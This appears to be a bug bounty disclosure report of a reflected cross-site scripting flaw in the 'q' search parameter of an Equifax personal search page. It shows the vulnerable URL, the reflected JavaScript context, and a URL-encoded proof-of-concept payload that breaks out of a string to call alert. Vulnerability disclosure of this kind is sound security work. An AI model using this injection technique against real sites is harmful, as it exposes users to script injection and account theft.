## Original Report

hi , I hope you are well, i found reflected XSS in this endpoint via ```q```  parameter:
```https://www.equifax.com/personal/search?q=broook```

###Steps:

1. open ```https://www.equifax.com/personal/search?q=broook```
2. view the source code of the page and search for word broook you will find that it reflected in the source code: 
{F2094877}

3. ```broook``` word reflected in javascript code:
```
<script type="text/javascript">

var pageProduct = null;
window.onload = function(e){ 
		
		Analytics.trackEvent('SEARCHRETURNED', {internalSearchTerm: "broook" , numOfSearchResultsReturned: 1});
	
}
</script>

```

4. By using this payload ```%22%20%2C%20internalSearchTerm%3A%20%5B"broook"%5D.map%28alert%29%20%2C%20numOfSearchResultsReturned%3A%20%22b``` , I modified the parameters of the ```Analytics.trackEvent``` function to be like this:
```
<script type="text/javascript">

var pageProduct = null;
window.onload = function(e){ 
		
		Analytics.trackEvent('SEARCHRETURNED', {internalSearchTerm: "" , internalSearchTerm: ["broook"].map(alert) , numOfSearchResultsReturned: "b" , numOfSearchResultsReturned: 1});
	
}
</script>
```
